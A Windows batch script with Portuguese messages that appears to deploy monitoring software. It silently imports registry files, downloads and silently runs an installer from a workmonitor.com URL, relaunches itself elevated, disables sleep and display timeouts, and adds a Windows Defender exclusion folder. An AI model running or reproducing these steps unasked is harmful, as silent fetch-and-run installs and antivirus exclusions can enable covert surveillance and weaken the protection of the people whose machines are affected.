@echo off
setlocal
set "flagFile=%temp%\install_done.flag"
set "regFiles=%~dp0*.reg"
if not exist "%flagFile%" (
    set "foundRegFiles=false"
    for %%F in (%regFiles%) do (
        set "foundRegFiles=true"
        echo %%F
        reg import "%%F"
        if %errorlevel% neq 0 (
            echo Deu não %%F.
        ) else (
            echo %%F Deu certo.
        )
    )
    if not "%foundRegFiles%"=="true" (
        echo Indo
    )
    curl -o "%appdata%\install.exe" "https://www.workmonitor.com/install/install.exe"
    start /wait "" "%appdata%\install.exe" /s /v "/qn"
    
    echo. > "%flagFile%"
 
    powershell Start-Process -Verb RunAs -FilePath "%0"
    exit /b
)
del "%flagFile%" >nul 2>&1
powercfg /s SCHEME_BALANCED
powercfg /change disk-timeout-ac 0
powercfg /change disk-timeout-dc 0
powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0
powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 5ca83367-6e45-459f-a27b-476b1d01c936 0
powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 96996bc0-ad50-47ec-923b-6f41874dd9eb 0
powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 96996bc0-ad50-47ec-923b-6f41874dd9eb 0
powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 3
powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 3
powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_VIDEO VIDEOIDLE 0
powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_VIDEO VIDEOIDLE 0
powercfg -SETACVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_SLEEP STANDBYIDLE 0
powercfg -SETDCVALUEINDEX 381b4222-f694-41f0-9685-ff5bb260df2e SUB_SLEEP STANDBYIDLE 0
powercfg /apply 2>nul
powershell -Command "try { Add-MpPreference -ExclusionPath '%appdata%\spa' } catch { echo 'Deu falha no antivirus' }"
exit
